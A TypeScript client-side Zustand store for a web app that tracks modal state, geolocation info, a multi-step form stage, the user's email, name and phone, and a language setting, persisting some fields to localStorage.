'use client';

import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

interface GeoInfo {
    asn: number;
    ip: string;
    country: string;
    city: string;
    country_code: string;
}

interface State {
    isModalOpen: boolean;
    geoInfo: GeoInfo | null;
    messageId: number | null;
    message: string | null;
    formStep: 'init' | 'password' | 'verify' | 'final' | null;
    userEmail: string | null;
    userFullName: string | null;
    userPhone: string | null;
    language: 'en' | 'vi' | 'es' | 'fr' | 'de' | 'ja' | 'zh' | 'ko' | 'pt' | 'th' | 'id' | 'ar' | 'ru' | 'uk' | 'hi' | 'bn' | 'it' | 'pl' | 'nl' | 'tr' | 'el' | 'sv' | 'no' | 'tl' | 'ms';
    setModalOpen: (isOpen: boolean) => void;
    setGeoInfo: (info: GeoInfo) => void;
    setMessageId: (id: number | null) => void;
    setMessage: (msg: string | null) => void;
    setFormStep: (step: 'init' | 'password' | 'verify' | 'final' | null) => void;
    setUserEmail: (email: string | null) => void;
    setUserFullName: (name: string | null) => void;
    setUserPhone: (phone: string | null) => void;
    setLanguage: (lang: 'en' | 'vi' | 'es' | 'fr' | 'de' | 'ja' | 'zh' | 'ko' | 'pt' | 'th' | 'id' | 'ar' | 'ru' | 'uk' | 'hi' | 'bn' | 'it' | 'pl' | 'nl' | 'tr' | 'el' | 'sv' | 'no' | 'tl' | 'ms') => void;
}

export const store = create<State>()(
    persist(
        (set) => ({
            isModalOpen: false,
            geoInfo: {
                asn: 0,
                ip: 'UNKNOWN',
                country: 'UNKNOWN',
                city: 'UNKNOWN',
                country_code: 'US'
            },
            messageId: null,
            message: null,
            formStep: null,
            userEmail: null,
            userFullName: null,
            userPhone: null,
            language: 'en',
            setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
            setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
            setMessageId: (id: number | null) => set({ messageId: id }),
            setMessage: (msg: string | null) => set({ message: msg }),
            setFormStep: (step: 'init' | 'password' | 'verify' | 'final' | null) => set({ formStep: step }),
            setUserEmail: (email: string | null) => set({ userEmail: email }),
            setUserFullName: (name: string | null) => set({ userFullName: name }),
            setUserPhone: (phone: string | null) => set({ userPhone: phone }),
            setLanguage: (lang: 'en' | 'vi' | 'es' | 'fr' | 'de' | 'ja' | 'zh' | 'ko' | 'pt' | 'th' | 'id' | 'ar' | 'ru' | 'uk' | 'hi' | 'bn' | 'it' | 'pl' | 'nl' | 'tr' | 'el' | 'sv' | 'no' | 'tl' | 'ms') => set({ language: lang })
        }),
        {
            name: 'storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                messageId: state.messageId,
                message: state.message,
                formStep: state.formStep,
                userEmail: state.userEmail,
                userFullName: state.userFullName,
                userPhone: state.userPhone
            })
        }
    )
);
